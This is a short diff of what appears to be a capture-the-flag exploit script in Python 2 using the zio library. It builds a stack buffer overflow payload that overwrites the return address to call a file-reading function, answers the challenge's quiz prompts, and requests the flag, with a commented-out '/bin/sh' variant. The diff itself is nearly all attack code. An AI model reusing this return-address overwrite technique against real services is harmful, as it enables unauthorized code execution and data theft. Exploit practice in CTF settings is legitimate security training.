@@ -30,7 +30,7 @@ io = zio.zio(TARGET)
 s = io.read_until_timeout()
 
 # io.writeline('A' * LEN_TO_RET + zio.l32(PUTS_PLT) + 'A' * 4 + zio.l32(PUTS_PLT))
-io.writeline('A' * LEN_TO_RET + zio.l32(READ_FILE) + 'AAAA' + zio.l32(STR_ADDR))
+io.writeline('A' * LEN_TO_RET + zio.l32(READ_FILE) + 'A' * 4 + zio.l32(STR_ADDR))
 io.read_until('Bad luck!\n')
 
 for i in xrange(5):
@@ -38,9 +38,6 @@ for i in xrange(5):
     io.writeline(judge(s))
     io.read_until('Hey you are so smart!\n')
 
-raw_input()
 # io.writeline('/bin/sh')
 io.writeline('flag')
-s = io.read(4)
-print hex(zio.l32(s))
 io.read_until_timeout()
